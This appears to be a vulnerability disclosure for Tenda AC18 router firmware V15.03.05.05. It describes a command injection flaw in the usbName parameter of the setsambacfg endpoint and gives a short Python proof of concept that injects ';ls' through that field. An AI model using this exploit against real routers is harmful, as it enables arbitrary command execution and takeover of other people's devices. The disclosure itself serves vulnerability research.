## Overview

- The device's official website: https://www.tenda.com.cn/product/overview/AC18.html

- Firmware download website: https://www.tenda.com.cn/download/detail-2610.html

## Affected version

V15.03.05.05

## Vulnerability details

In Tenda AC18 V15.03.05.05 firmware, we discovered a command injection vulnerablility in the `usbName` parameter and the `v9`varable is directly passed to a `doSystemCmd` function, causing an arbitrary command execution. The user-provided `usbName` can trigger this security vulnerability.

![image-20240316183617956](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240316183617956.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/setsambacfg"
payload = ";ls"

data = {"action":"del","usbName": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240316180711436](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240316180711436.png)
